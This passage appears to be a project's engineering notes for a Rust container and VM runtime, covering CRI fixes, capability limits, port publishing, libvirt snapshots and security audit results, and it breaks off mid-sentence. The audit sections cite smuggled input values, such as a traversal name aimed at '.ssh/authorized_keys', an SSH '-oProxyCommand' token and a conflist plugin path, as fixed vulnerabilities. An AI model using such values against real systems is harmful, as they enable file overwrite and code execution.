Both defects were measured against a real kubelet (VM of `delonix-vm-k8s:1.36`, k8s 1.36.4)
with the same acceptance script, before and after the fix.

**Eviction manager without stats.** The `writable_layer` of `ContainerStats` announced
`<root>/containers/cri-<id>`. That is the container's NAME; the engine stores the directory by its
own id (`<root>/containers/<id>/upper`). Each kubelet `stat` failed ("failed to get device
for dir … no such file or directory"), the eviction manager was left without summary stats and node-pressure
protection was off. It now points at the real directory and measures blocks and
inodes; a container the engine no longer knows returns the root (which exists) with zero usage.
Before: 6 failures per minute and no pod with `ephemeral-storage`. After: 0 failures and 4 pods.

**`kubeadm reset` with orphans.** `StopPodSandbox` called `container stop` without `-t` (the engine's
long grace), in series, and ignored the result. kubeadm gives 2 s to each call: 9
`DeadlineExceeded`, and there remained 1 container in the engine, 1 sandbox and 1 container record that
nothing would ever remove again. It now forces the stop (`-t 0`, what the CRI contract asks, because the
grace was already given by the kubelet) and returns an error if anything is still alive. `RemovePodSandbox`
deleted the record even when `rm -f` failed — the origin of the engine's containers without a CRI
record, invisible to the kubelet. It now follows the `RemoveContainer` rule. After: 0 orphans and 0
`DeadlineExceeded`. The two operations now record themselves in the journal: a successful reset
did not leave a single line on the CRI side.

Trap: **there is no unit test for the failed `rm`**. Simulating it requires changing `DELONIX_BIN`,
which is global to the process and is read by the other tests in parallel. The proof is the measurement on the node.

## Capabilities ceiling on the CRI (`DELONIX_CRI_CAP_CEILING`, v0.47.0)

A MAXIMUM limit, defined on the node, for the capabilities of any container created through the CRI
— whatever the kubelet asks, including `privileged: true`. `crates/interfaces/delonix-cri/src/
cap_ceiling.rs` (`CapCeiling`), configured by `DELONIX_CRI_CAP_CEILING` / `..._MODE` or by
`delonix serve cri --cap-ceiling/--cap-ceiling-mode` (flag > env, same precedence as `--addr`).

**Why in the runtime and not only in admission.** Everything that reaches `create_container` already comes
authorized: the securityContext is translated into flags with no opinion at all (correct — the runtime is not
the admission controller). That leaves the only barrier between a `privileged: true` and all of the kernel's
capabilities in an admission chain that runs in another process, on another machine, and whose
configuration this node cannot see or verify. The ceiling is the local answer: it holds even with
Pod Security misconfigured, with a `crictl` talking directly to this socket, or with a
static pod that never went through the API server.

- **Safe default (2026-10-12)**: with no configuration, the ceiling is `default` (the engine's `KEPT_CAPS`,
  `reject` mode) — absent or empty no LONGER means "no ceiling". A normal pod runs as before;
  `privileged: true` and `capabilities.add` above the default set are rejected at
  `CreateContainer` until the operator widens it on purpose (`default,NET_ADMIN`, or `all`). `all` is the
  only way out and it has to be written: no empty or missing value gets there by accident. The
  `Default` of the `CapCeiling` type is the safe ceiling; `CapCeiling::unlimited()` is only for whoever asks for it.
- **Grammar** (`parse`, pure and tested): absent/empty → `default`; `all` → **no ceiling** (explicit,
  and the startup warns); `none` → no capability; `default` → the engine's `KEPT_CAPS`;
  `default,NET_ADMIN` → the baseline plus the named ones; a list of names (`CAP_` optional,
  case-insensitive) → exactly those. An unknown name, an unknown mode, or a value with only
  separators **prevent the server from starting** (`exit 2` in `delonix-cri`, a CLI error in
  `serve cri`, in both cases before any `bind`) — a ceiling that silently fell back to
  "unlimited" because of a typo was precisely the failure this exists to avoid.
- **Two modes, and the asymmetry is deliberate**: an EXPLICIT request above the ceiling (`capabilities.
  add`, or `privileged`) is **rejected at `CreateContainer`** with `PermissionDenied` NAMING the
  denied capabilities (the kubelet shows it on the pod immediately) — `mode=clamp` cuts it and warns at
  `warn`, to harden a node whose PodSpecs cannot be changed today. But the **implicit baseline**
  (the `KEPT_CAPS` a container receives without requesting anything) is reduced to the ceiling **without error in both
  modes**: lowering a default the workload never requested is what "ceiling" means, and rejecting all
  the node's pods because the engine's own default is wider than the limit would make the
  feature useless.
- **The clamp does not reimplement capability resolution** — it calls the ENGINE's `resolve_cap_keep` and
  intersects with the ceiling, emitting `--cap-drop ALL` + one `--cap-add` per capability of the final
  set. That is why the `delonix_linux::capabilities` module became **public** (`KEPT_CAPS`/
  `cap_num`/`cap_name`/`all_caps_mask`/`resolve_cap_keep`/`names_from_mask`, moved out of the inside of
  `lib.rs`): a second name↔number table on the CRI side would diverge the day a capability
  was added here — the same generator-and-reader-share-the-format discipline as
  `fw_rule_tail`. There is a round-trip test (`cap_name`↔`cap_num` for 0..=40, and mask→names→mask).
- **It limits ONLY capabilities.** A privileged pod still has `seccomp=unconfined`, `/sys`
  writable and its own cgroupns — these are separate axes of `--privileged`, and cutting capabilities does not
  make a privileged pod safe. The module says so instead of suggesting a hardening it does not
  deliver.
- **Trap caught by the test, of the "a test can encode the bug" kind**: the first version
  modeled `privileged` as `resolve_cap_keep(cap_drop, ["ALL"])`, which seems equivalent and is not
  — in the engine `privileged` **ignores** `cap_drop` entirely (`if privileged { all_caps_mask() }`).
  The clamp has to predict what the engine GRANTS, not what it arguably should. Dedicated test
  (`privileged_ignora_o_cap_drop_como_no_motor`).
- **Observability**: banner at startup (server stdout + `tracing::info`) and the ceiling in force
  in `status(verbose)` → `info["capabilityCeiling"]`, readable by `crictl info`. Without this, an active
  but invisible ceiling would be diagnosed as "the runtime dropped my capabilities for no reason". The
  clamp's `warn` only comes out when an EXPLICIT request was cut (`ceiling_reduces`) — warning when
  only the baseline dropped would give a line for every container startup on the node.
- **Validated live on this host**: fail-closed on both entry points (invalid value and mode,
  in EN and PT, no socket created); a real `delonix-cri` server announcing the expanded ceiling; and — the
  central assumption of the clamp — the emitted argv applied by the real ENGINE, with the kernel confirming
  `CapEff 0x1001` (CHOWN+NET_ADMIN exact) against `0xa0042dfb` of the baseline and `0x1ffffffffff` of a
  `--privileged`. **CLOSED on 2026-08-15**: this note said the gRPC path was not validatable here
  because there is no `crictl` and `build_client(false)` generated no client stubs — and concluded that "the
  tonic layer is three lines of `blocking(...)`". That is a reason to THINK it works, not
  a measurement. The client is now generated (cost measured before deciding: **3.5 s** of build in the
  crate) and `crates/interfaces/delonix-cri/tests/grpc_status.rs` does the round-trip for real — it brings up the server on a
  unix socket, calls `Version` and `Status` through the generated client, and requires the two conditions the
  kubelet reads. Verified to catch regression: with `Status` returning empty conditions, it fails
  in "missing RuntimeReady: []".
  **And since 2026-09-11 it is exercised by `crictl`**, the OFFICIAL client of the Kubernetes
  project, against a real `serve cri` on this host: `version` (`RuntimeName: delonix`,
  `RuntimeApiVersion: v1`), `info` (`RuntimeReady: true`, with the `capabilityCeiling` visible),
  `images`, and the whole cycle the kubelet drives — `runp` (sandbox `Ready`) → `create` →
  `start` (`Running`) → `exec`. The **kubelet labels and annotations survive**
  (`io.kubernetes.pod.name`/`.namespace`/`container.name` come back in `ListContainers`, which is how
  `crictl ps` fills the POD and NAMESPACE columns — a container created WITHOUT them appears as
  `unknown`, and that is the client telling the truth, not the engine losing them: measured on both sides).
  Still to be validated with a real **kubelet** — that needs a node, not a client —, but
  it is no longer "three lines of blocking" nor just an internal test.
- **To do, deliberately**: none of this touches the CLI's `container run` (there it is the
  operator who chooses, not a remote request — a local ceiling would be the user limiting themselves); and
  the CRI's `add_ambient_capabilities` still has no translation at all in the engine (pre-existing gap,
  prior to this work).

## A `hostPort` the node does not publish is REJECTED by name (ADR-0074, 2026-10-07)

Found while validating the answer to "does `net ingress publish` bind on 0.0.0.0 or only on loopback?".
`cri_port_specs` mapped `Protocol::Sctp` to the string `"sctp"` and an unknown protocol
number to `"tcp"` — that is, it **had its own opinion about what the engine can
publish**, and it was wrong on both.

**Three measurements, each against the thing and not against what one reads:**

1. **The ROOTLESS dataplane does not know SCTP — and only it.** `slirp4netns` 1.2.1 (libslirp 4.7.0),
   probed via the api-socket against a throwaway netns: `tcp` and `udp` return an id, `sctp`
   returns `bad request: add_hostfwd: bad arguments.proto`. It is the DATAPLANE, not the parser.
   **Fixed the same day, by measurement**: this section started by saying that "the CNI's `portmap`
   also only speaks tcp/udp, so no path publishes SCTP" — a statement taken from the upstream
   specification and marked as unmeasured. It is FALSE. The `kubernetes-cni` `portmap` writes
   `-p sctp -m sctp --dport 31070 -j DNAT`, and with the `sctp` module loaded a real SCTP client
   on the node reached a server inside the pod's netns. So the root/CNI path publishes SCTP end to
   end, and only the rootless slirp cannot.
2. **The spec did reach the container** (`o.ports = sb.port_mappings`), where
   `parse_publish_addr` rejected it — so the pod died in `StartContainer`, **after** the
   sandbox existed, with an error naming the SPEC (`invalid protocol in '8080:80/sctp'`) and not the
   cause, on a manifest that is legal Kubernetes, and retried by the kubelet forever in a
   condition it can never clear.
3. **`hostNetwork` is really the host's network** — a `--net host` container reports the SAME inode
   `net:[...]` as the host and sees the node's interfaces. It binds the node's ports itself, whatever
   the transport, and that is why rejecting there would break a case that WORKS. It is also the
   reason the mappings are not handed to it (the `run_opts_of` guard).

The rejection lives in `RunPodSandbox`, beside that of `cgroup_parent` and for the identical reason: a
`failed_precondition` puts the pod in `Pending` with the reason as an event, which is where the operator
looks. **Not a silent drop** — a declared and unpublished `hostPort` leaves the pod
`Running` with a service that does not answer, the family this engine has already had to remove three
times (`--network-alias`, `--security-opt seccomp=`, `-v …:z`); and a warning would go to the journal
of `delonix-cri`, whereas whoever can act reads `kubectl get pod`.

**The transport is asked of `delonix_sdn::Proto`**, the single authority on what the engine publishes.
A number outside the CRI enum is rejected BY NUMBER instead of guessed — it was a guess about
the one field whose job is to say what the traffic is.

**The radius is narrow, and that is what makes the rejection cheap**: a `containerPort` without a `hostPort`
continues to be DISCARDED (`m.host_port > 0`), which is the correct k8s semantics (it is informative)
and is the form a **Service** SCTP uses — it goes through kube-proxy, never through `hostPort`. So SCTP
services remain untouched, and no pod that works today starts to fail: that combination
already failed, later and worse.

**"Not implemented", never "impossible"** — and the first version of this rejection got that wrong. It said
"this node has no path for SCTP", which reads as a permanent limit. Measured the same day, in a
throwaway netns: **the kernel accepts** `sctp dport 5070 counter … dnat to 10.0.0.5:5070`. That is,
in root mode the engine published SCTP with the nftables it already writes for its ingress, without slirp
or portmap. The rejection stays — none of that is built —, but the word changed. It is the owner's
doctrine (2026-10-07): rootless-FIRST is not rootless-only, and "needs root" does not drop
a capability (see the principles at the top of this file).

**And the rejection is BY PATH, because the paths differ.** A blind answer would also reject SCTP
on root/CNI, where it works. Only the native rootless ingress rejects a transport, and only the one its
slirp does not load; `hostNetwork` judges nothing.

**The larger half was DONE, and it was one job instead of two**: in root/CNI mode the `hostPort`
was not published for ANY protocol — the guard `if !sb.host_network && sb.cni_netns.is_empty()`
discards the mappings — and nothing said so. The `portMappings` now pass as the plugin's
`runtimeConfig`, as containerd does, and that delivers tcp, udp **and** sctp at once. The capability
argument is injected into the CONFLIST, and that is what dispenses with new plumbing on both paths: root
hands the list to `attach_named_netns`, rootless hex-encodes the SAME JSON on the holder's control
line (whose shape does not change), and storing the result as the sandbox's conflist gives the `DEL`
back the identical configuration — which is what the specification asks of a runtime. A chain that does not declare
`portMappings` is rejected by name, with the fix: attacking and going silent was the silence this
removes.

**Measured in the lab** (VM of this repo's golden `delonix-vm-k8s:1.36`, with the same script against the two
binaries): `origin/main` created the sandbox with **0** DNAT rules and the port mute; with the fix,
**3** rules, `LAB-OK` through the host port, and **0** rules after the `rmp` — which is the proof that the
`DEL` also receives the `runtimeConfig`.

**Proof**: 4 unit tests, a real gRPC round-trip over the unix socket that also asserts that
**no sandbox remains** (the half saying the rejection happened before creating), and a gate in the
battery with `crictl` — the official k8s client — with a TCP control alongside. The three tests that
matter fail with the fix reverted (the other two are controls and stay green, on
purpose). Live, isolated root: `crictl runp` with an SCTP `hostPort` → `rc=1`,
`code = FailedPrecondition`, the message naming port, transport and the two outputs; `crictl
pods` empty; and a TCP `hostPort` on the same node created `Ready`.

**Auditor's own note**: the battery's comment said that there we do not fake a gRPC request
"that we don't know how to do here" — and `crictl` was installed. The new gate closes that gap
along the way.

## Security audit #2 (VM code of this series: console/network/cloud-init)

The `delonix-runtime-sec` skill run over the NEW surface of the v0.7.x (VM
console/vnc, automatic firmware/backend, libvirt network, cloud-init user-data,
installer). The container `run` is clean (generated id + `safe_key`); the VM was the
exception because the auxiliary paths used the RAW name.

**HIGH finding — FIXED — path traversal via the VM name.** The name (from the CLI OR
from `metadata.name` of an UNTRUSTED manifest via `stack apply -f`) flowed raw
to `state_root/vms/<name>` (`generate_seed_iso`) and to the overlay
`<name>.qcow2` — a `metadata.name: "../../.ssh/authorized_keys"` wrote/
overwrote files OUTSIDE the state directory, as the user
(manifest-driven arbitrary file write). `JsonStore` already sanitized the
`.json` (`safe_key`), but the seed/overlay/sock paths did not. **Fix**:
`delonix_vm::valid_vm_name` (whitelist `[A-Za-z0-9._-]`, no `..`/`/`/leading
`-`/control) called at the top of `delonix_vm::create` — the engine
boundary, so any consumer of the API inherits it. It closes at once the 3
vectors of the name: traversal, `virsh` argv, and injection into the cloud-init YAML
(the name becomes the `hostname`). Test `valid_vm_name_recusa_exploits`.

**LOW finding — FIXED — `virsh` argv without `--`.** `virsh -c uri console/
start/destroy/domstate/... <name>` without `--`: a name starting with `-` would be read
as an option. Already covered by `valid_vm_name`, but `--` was added before the
name/network in all `virsh` argv (defense in depth, same pattern as the
`ssh`/`scp` of audit #1).

**MEDIUM finding — FIXED — predictable temp file (libvirt network).**
`ensure_libvirt_network` wrote the network XML to `/tmp/delonix-libvirt-
default-<pid>.xml` (predictable name, world-writable) with `fs::write` — another
local user could pre-create a symlink and divert the write. **Fix**:
`OpenOptions::create_new` (O_EXCL, does not follow symlinks) + `mode(0o600)`.

**MEDIUM finding — DOCUMENTED — installer downloads without checksum.** The
`install.sh` verifies the `delonix` binary against `SHA256SUMS`, but the
`cloud-hypervisor-static` and the `hypervisor-fw` (official upstreams) are
installed only over HTTPS, without hash verification — the upstream does not publish
checksums in a convenient format. MITM mitigated by TLS; a compromised
upstream or TLS-stripping would pass. Accepted as a documented risk (same
nature as the cloud-hypervisor that was already installed this way); closing it would require the
upstreams to publish/pin a digest.

## Broad E2E audit (14 finders × adversarial verification) — state

Offensive audit of the whole ecosystem (~50k LOC, 9 crates: bugs/gaps/design/
performance/concurrency/memory/resources), 14 finders per subsystem, each
finding passed through 2 adversarial skeptics. **Full report in
[docs/AUDITORIA-E2E.md](docs/AUDITORIA-E2E.md)** — 24 confirmed findings (6 HIGH,
12 MEDIUM, 6 LOW) + 11 to-verify in that original run.

**The 6 HIGH were FIXED in v0.9.0** (path traversal in OCI whiteouts via
`safe_rel`+canonicalized confinement; CRI IDs via `valid_cri_id`+`remove_rec`;
VM name in `generate_seed_iso` via `valid_vm_name` at the source; kubeconfig via
`sudo cat` to the SSH stdout, never touches remote disk; build `COPY` via
`confine_to` (canonicalizes + checks `starts_with`); management socket via
`SO_PEERCRED`+mode 0600, mirrored in `delonix-cri`) — **re-verified live
in a 2nd session (2026-07-23), current code read line by line, the 6 remain
fixed**, without regression. **Genuine INDEPENDENT adversarial audit done
on 2026-07-26** (the 2026-07-23 session re-read its own code, but it was not a
2nd pair of external eyes actively trying to reconstruct each exploit): 5/6
confirmed solid when trying to reproduce the original exploit; the kubeconfig
had a **real residual TOCTOU** (not hypothetical) — `fs::write` creates the
file in the umask mode (664 measured live on this host) and only AFTER applies
`chmod 600`, a window in which another local user could read the
cluster-admin credentials. **Fixed**: `OpenOptions::mode(0o600)` sets the
mode ATOMICALLY at creation (`cmd/cluster.rs::fetch_kubeconfig`), the same
pattern `ensure_libvirt_network` already uses — see
`docs/COMPARACAO-DOCKER-PODMAN.md` section 1a/1b for the full report.

**Of the other 29 (12 MEDIUM + 6 LOW confirmed + 11 to-verify), the
2026-08-04 re-triage confirmed that practically ALL are already closed** —
this note said "27 remain open" and was WRONG: it was `AUDITORIA-E2E.md`
that had never been updated as the fixes landed. Each one was
re-verified by reading the current code (not by the table), and the header of
`docs/AUDITORIA-E2E.md` records the sample of what was confirmed and how. The only
real residue found in that triage was #11 (`SecretStore::save` without `fsync` and
with a mode TOCTOU), fixed in v0.38.3. **Method lesson**: a findings table
that is not updated with the fixes starts to lie in both directions —
here it made 27 solved problems look like live debt for weeks. The 2 "to-verify" of greatest
severity of the original run **are already
CONFIRMED FIXED** (`AUDITORIA-E2E.md` still lists them as open by
oversight — `docs/COMPARACAO-DOCKER-PODMAN.md` has the detail of each): rootfs escape
in the rootless `--rm` (`container.rs`, both foreground/watcher branches already
call `remove_container_dir`, since commit `7bde467`/v0.19.0) and the global
`egress` that deleted per-network rules by too-broad substring match
(`infra.rs:1531`, `is_global_egress_drop_line` already excludes lines with
`iifname`, confirmed in the 2nd round — see section 1b of `COMPARACAO-DOCKER-PODMAN.md`).

### 2nd round (2026-07-23) — 4 audits in parallel, 2 CRITICAL + 3 HIGH new, FIXED in v0.10.1

A full review requested (bugs/gaps/design/architecture, not only security). On
top of re-verifying the 35 findings above, 3 fresh audits: `delonix-runtime/
lib.rs` (104 `unsafe`, NEVER audited before), `delonix-sdn/infra.rs` (holder/
control-socket), and all the code of this SAME previous session (Tunnel, ShareVolume,
`cluster.rs`, grouped specs) — code with zero prior review. 2 CRITICAL + 3
HIGH, **all already in production in v0.10.0**, fixed immediately (see
[docs/releases/archive/v0.md](docs/releases/archive/v0.md) (section v0.10.1) for the full detail).
**Confirmed independently on 2026-07-26**: a fresh adversarial audit
on these TWO same files (uid/gid mapping, seccomp/`clone3`,
`safe_bind_target`, eBPF of the device-cgroup, fd hygiene on all forks,
`SO_PEERCRED` on all dispatch of the control socket) found no new
CRITICAL/HIGH finding — see `docs/COMPARACAO-DOCKER-PODMAN.md` section 1b
for the full report. The original findings of this round:

1. **`kind: ShareVolume` with `name: ".."` escaped to the entire parent Storage** —
   `VolumeStore::valid_name` accepted a name made only of `.` (`".."` passed the
   charset); `sharevolume rm --purge-data` on that name deleted the whole shared
   NAS. Fixed in `valid_name` (rejects `.`-prefix/`..`), protects all
   consumers of the store.
2. **SSH argv injection via the `kind: Tunnel` token** — the pinggy token went
   without `--` as the last positional argument of `ssh`; a token
   `-oProxyCommand=<cmd>` was read as an option → local RCE. Fixed in
   `resolve_token` (rejects leading `-`) + `--` in the argv.
3. **Container names never validated** — `container run --name
   registry.npmjs.org` (unprivileged) hijacked the DNS resolution of that
   hostname for the WHOLE node, in any namespace. Fixed with
   `valid_container_name` (excludes `.` deliberately, unlike
   `valid_vm_name`).
4. **`cluster kubeadm --copy-kubeconfig` trusted the remote `admin.conf` in
   full** — a legal `users[].user.exec` becomes local RCE on the operator if the
   control-plane is compromised after provisioning. Fixed:
   `safe_cluster_entry`/`safe_user_entry` build new entries only with the
   fields that the real kubeadm `admin.conf` has.
5. **Bind-mounts followed symlinks planted by the image, before the `pivot_root`**
   — `mount_target_safe` only lexical; the image could redirect
   `create_dir_all`/`open` to any real path of the host. Fixed with
   `safe_bind_target` (resolves component by component, rejects symlinks) — the
   equivalent, on the engine side, of the build's `confine_to`.

All validated live against the real exploit, not just unit tests (see the
commit history `4c3e223`/`456925f`). Finding #3 above is an escalation of the
"to-verify" MEDIUM DNS-hijack finding of the original run (the direct CLI,
with no manifest at all, already sufficed).

### Holder privilege surface (S4 of the NaaS audit, 2026-09-27)

Origin: `docs/discovery/62_NAAS_FASE0_AUDITORIA.md` §6 P1 and §7 S4. `SO_PEERCRED`
says WHO speaks on the control socket; it did not say what a value coming from a manifest
or from a flag could be. Fixed:

- **`validate_control_tokens`** runs at the top of `handle_control`, before any
  branch (the included queries): no token that reaches an argv starts with `-` (the
  `sanitize` lets `-` through, so `attach -n …` reached `ip netns add -n`; the
  only exception is the literal `-` of the `vxlan` without peers, and the namespace token, which is
  only hash); `ip`/`gateway` of `attach`/`attach-extra`/`vmtap`/`vxlan` are strict
  IPv4; `rate`/`burst` of `netrate` and the two of `l4guard` are digits only (previously
  a silent `unwrap_or`); `wg-up`/`wg-peer`/`wg-peer-del` validate interface, port,
  key, address, endpoint `ip:port` and allowed-ips.
- **The `wg-up` interface name composes the temporary file path with the PRIVATE
  key** (`.{name}.key.tmp`). **2026-09-27 correction to what #552 claimed**: a `../` in the name did NOT
  manage to write the key outside the `wg` directory
  — `ip link add` runs first and iproute2 rejects a name with `/` ("not a valid
  ifname", measured live on iproute2 6.1). It was only the ORDER of operations protecting it.
  `wg::ensure_iface` and `wg::set_peer` now validate at the sink itself
  (`valid_iface_name`, `validate_peer`), which stops depending on that order and covers
  the `pub` API, not only the holder's line. The response never echoes the key.
- **`cni::resolve_plugin`** rejects a `type` that is not a simple name: `Path::join`
  replaces the base with an absolute path and `..` leaves it, so a conflist with
  `"type": "/tmp/x"` executed an arbitrary binary in the holder. `run_one` and
  `readiness` say "invalid config", not "plugin missing".
- **Compatibility**: the line format does NOT change — every line that a client
  of this build or of an earlier one legitimately sends keeps passing (test
  `every_legitimate_line_still_passes`). A holder still running from an old binary
  keeps the old behavior until it is recreated (`delonix net netns down` + `up`);
  the client needs nothing.
- **Validated live (2026-09-27, throwaway Ubuntu 24.04 VM, binary `79648b55`)**,
  only legitimate paths: `attach` on a CIDR network `172.20.4.0/22` (IP `172.20.7.x/22`,
  gateway `172.20.4.1`); `attach` of 6 tokens with `--namespace`; `--net-connect`
  (`eth1` on `10.231.0.2`); `--net-rate 10mbit`; encrypted overlay (`wgo000064` with
  `10.99.0.1/24`, peer with endpoint `ip:port` and allowed-ips `/32`, with no
  temporary key file left behind); `vm bridge --apply` as root (its own section).
  Nine identical cold starts with the previous binary and with this one.
  **Seen along the way and NOT from S4**: on a CIDR network outside 10.200–10.254 the traffic
  between namespaces passes (P0-5, S1); on `10.231` it is cut (100% loss).
## VM lifecycle in libvirt (`vm stop/rm`) — managed save, orphans, `--force`

Real bug report (host kaeso-sys-01): `vm rm dev` leaked the raw `virsh` stderr
("Failed to destroy… not running" + "Refusing to undefine while domain managed
save image exists"), deleted the local record ANYWAY and left the domain
**orphaned** in libvirt; the next `vm stop` answered "no such container" (the
wrong noun). Fixed in `delonix-vm` (`libvirt_cleanup`/`quiet`/
`libvirt_poweroff`/`libvirt_domain_uri`) + `cmd/vm.rs`:

- **`undefine` always carries `--managed-save --snapshots-metadata --nvram`**
  (fallback to the plain form on old virsh) — it was the root cause of the
  refusal; `destroy` only runs if the domain is NOT "shut off". Nothing from
  `virsh` leaks raw: `quiet()` captures stdout+stderr and composes the message
  (without virsh's `error: ` prefix).
- **`VmBackend::stop` returns a `Result`** and `rm` **preserves the local record
  if the backend cleanup fails** (clear error + hint); `vm rm -f/--force`
  discards the local state anyway. No silent orphans in either direction:
  `rm`/`stop` also recognize a libvirt domain WITHOUT a local record (orphan
  from before the fix) and clean it up / power it off.
- **`Error::VmNotFound`** ("no such VM: … (see `delonix vm ls`)") in
  `stop`/`remove`/`status` — the shared `NotFound` says "no such container".
  Trap to remember: **`JsonStore::remove` is idempotent** (absence = Ok), so
  "it didn't exist" has to be decided BEFORE (the `existed` flag), not from the
  return of `st.remove`. `vm rm <nonexistent>` is now an error, as in docker.
- Aliases: `vm down` = `stop`, `vm delete` = `rm`. Tests:
  `quiet_captura_o_stderr_sem_o_prefixo_error`,
  `stop_e_remove_de_vm_inexistente_dizem_no_such_vm`. Validated live: the real
  `dev` orphan (shut off + managed save) was removed silently.

### `vm console` stuck on "Active console session exists" (v0.11.1)

Real bug report (host kaeso-sys-01): after a `vm console` ends in an unclean way
(SSH dropped, Ctrl-C hitting the foreground `virsh`, terminal closed), libvirt
keeps believing there is a console session attached to that domain — every
subsequent `vm console` attempt on the SAME VM fails forever with `error:
operation failed: Active console session exists for this domain`, with no way
out except restarting the host's `libvirtd`.
**Fixed**: `--force` on `virsh console` (`cmd_console`, `cmd/vm.rs`) — the flag
exists for exactly this ("disconnect already connected sessions"). Since `vm
console <name>` is a single-operator command, a session stuck from your OWN
previous connection is the overwhelmingly common case, not a second real
spectator to protect.

### `vm snapshot create|ls|rm|restore` — first-class system checkpoint (libvirt)

Snapshot/restore as first-class methods of `VmBackend` (before, they existed as
nothing at all — the trait had `boot/stop/is_running/ip`, see the Phase 1
discovery matrix). Engine functions `delonix_vm::{snapshot,restore,snapshots,delete_snapshot}`
(mirror `stop`/`status`: `load_vm` + `backend_for` + dispatch).

- **BREAKING in v0.51.x, clean cut with no aliases**: the three FLAT commands
  (`vm snapshot <vm> <n>` / `vm snapshots <vm>` / `vm restore <vm> <n>`) gave way to the
  group **`vm snapshot create|ls|rm|restore`** — the same four verbs, in the same
  order, as the `volumes snapshot` that already existed (a checkpoint is a checkpoint;
  whoever learned one shouldn't have to learn the other). The direct reason was that
  there was **no way at all to DELETE** a snapshot from the CLI — the only way out was
  `virsh snapshot-delete`, and it was the engine's own error message that told you to
  do it. The `vm` group is declared NOT stable in `docs/cli-stability.md`, and the old
  form fails **loud** (`unrecognized subcommand`, rc=2), never silently.
- **libvirt**: `virsh snapshot-create-as --domain <vm> --name <n> --atomic` — from a
  **running** VM it is a SYSTEM checkpoint (memory **+** disk), and `restore`
  (`snapshot-revert`) goes back to it. Pure, tested argv (`libvirt_snapshot_argv`/
  `libvirt_revert_argv`, via `--domain`/`--name`, never positional → a validated name
  never becomes an option). Snapshot name validated with `valid_vm_name` (rejects `..`/
  leading `-`/injection).
- **The four verbs work with the VM STOPPED** (v0.51.x) — and this was the limitation
  that remained: `stop` *undefines* the domain, and with no domain virsh answered
  `failed to get domain`, a phrase that sends you looking for a VM that is right there
  in `vm ls`. `with_stopped_domain` **defines the domain only for the duration of the
  command**, from the `vms/<vm>.xml` that the last `boot` wrote — the same file libvirt
  had, DAC seclabel included, instead of deriving a description that would then have to
  match the `boot` by hand — returns the preserved metadata, runs the verb, saves it
  again and undoes the domain. That is why `stop` **stopped deleting `<vm>.xml`**.
  A snapshot taken this way is **disk-only** (`state=shutoff`), which is the honest
  thing for a VM with no memory to capture, and the VM **stays stopped**. The ONLY
  exception where the domain stays defined is a `restore` of a checkpoint taken while
  running: the revert restores the memory, so the guest ends up running — undoing the
  domain under a live VM is not cleanup, it is killing it. In that case it warns
  (`note: … is RUNNING again`) and the public `restore` reconciles the record by
  calling the `status` that already exists, instead of writing a second reconciler that
  might disagree with it.
- **The CLASS of the failure is the same whether the VM is stopped or running** —
  `Error::NotFound` (**4**) for a snapshot that doesn't exist, `Error::Conflict` (**5**)
  for a name already in use. Before, the two came out as a generic **1** with virsh's
  raw response, where «domain moment off1 already exists» uses a word (`moment`) that
  this CLI never says.
- **The snapshot SURVIVES a `vm stop`/`vm start` (v0.51.x)** — and until now it didn't,
  silently. Real bug report, reproduced before any code: `snapshot` → `stop`
  → `start` left `vm snapshots` **EMPTY with rc=0** and `vm restore` answering
  «Domain snapshot not found». Cause: the `undefine --snapshots-metadata` of
  `libvirt_cleanup`, which `stop` reuses. **What the measurement changed**:
  `qemu-img snapshot -l` over the overlay showed `s1` **intact** after the stop — the
  `undefine` doesn't delete the snapshot, it only deletes what points to it. So this
  wasn't a limit of the mechanism, it was **state needed to rebuild the resource being
  thrown away** — the same trap as the un-persisted `-v`, the extra networks and
  `Container.pod`, now on the libvirt side.
  - `VmBackend::preserve_snapshots` (default: nothing, so CH and Proxmox stay byte for
    byte the same) does a `snapshot-dumpxml` of each one to `vms/<vm>/snapshots/<n>.xml`
    — inside the directory that `remove` **already** deletes entirely, with a test
    demanding it (elsewhere, a `vm rm` would leave metadata pointing to a disk that no
    longer exists, and the next VM with the same name would inherit it). It is called by
    the PUBLIC `stop`, **before** `backend.stop`: a failure aborts the stop with nothing
    lost. `remove` does not go through there on purpose.
  - `boot` gives them back to libvirt right after the `define` — and what was missing
    for that wasn't obvious: `snapshot-create --redefine` **REFUSES** an XML whose
    domain uuid is not the current one, and the uuid is assigned by libvirt on each
    `define`, so it is never the one from when the snapshot was taken.
    `snapshot_xml_with_uuid` rewrites it (pure, tested) — in ALL occurrences, which
    are two in the real file; replacing only the first gives the same error from the
    occurrence left behind.
  - **`vm snapshot ls` of a stopped VM reads the preserved ones** — asking libvirt for
    a domain that doesn't exist returns an empty list, indistinguishable from «never had
    a snapshot».
  - **Gate**: a new section in `scripts/e2e.sh` that runs the CYCLE (create → stop → start →
    restore, plus the four verbs with the VM STOPPED and the 4/5 classes) against a real
    libvirt VM, and skips with an audible line without virsh/libvirt. Today **20/20**;
    the version that covered only the original cycle was verified by the repo rule at
    **9/9 with the fix and 4/9 with it reverted**. It had to be the cycle — before the
    fix each command returned 0 on its own. And `rm` is confirmed with
    `qemu-img snapshot -l`: leaving the LIST is not leaving the disk.
- **Cloud Hypervisor (v0.51.x): the same four verbs, OFFLINE** — `qemu-img snapshot
  -c/-a/-d` on the VM's overlay, and `ls` via `qemu-img info -U` (pure parser, written
  against the REAL output; the first version broke on the header line and returned an
  empty list — the test caught it before the first use). With the VM **running**, the
  three verbs that WRITE are **refused with a directed error** (`vm stop` first, or
  `--backend libvirt`); only `ls` answers, and that is why it needs `-U`: the vmm holds
  the qcow2 and `snapshot -l` opens read-write.
  - **Why CH's own `vm.snapshot` was NOT exposed**, even though it exists and works
    (measured live on a real VM: `pause` → `PUT /api/v1/vm.snapshot` → `resume` writes
    `config.json` + `state.json` + a `memory-ranges` the size of the guest's entire RAM,
    512 MiB): it saves **memory and devices, NOT the disk**, and CH has no live disk
    snapshot API at all — while the vmm runs it holds the qcow2 exclusively, so nobody
    else can capture it (`qemu-img` answers «Failed to lock byte 100», measured, with and
    without `-U`). Restoring it later, against a disk that kept being written, is not
    going back: it is a guest whose memory believes in a filesystem that has already
    changed. Exposing it as `snapshot` would make the SAME command mean «go back in time»
    in libvirt and «resume this instant, if nobody touched the disk» here — the silent
    divergence between backends that this engine refuses to publish. A `vm suspend`/`vm
    resume` pair is where that capability belongs.
  - **Its own gate** (`scripts/e2e.sh`, CH section): **13/13** live — the refusal with the
    VM running (and that the message says what to do), the four verbs with it stopped, the
    4/5 classes, `ls` answering with the vmm holding the file, and `rm` confirmed with
    `qemu-img snapshot -l`. Skips with an audible line without `cloud-hypervisor` or when
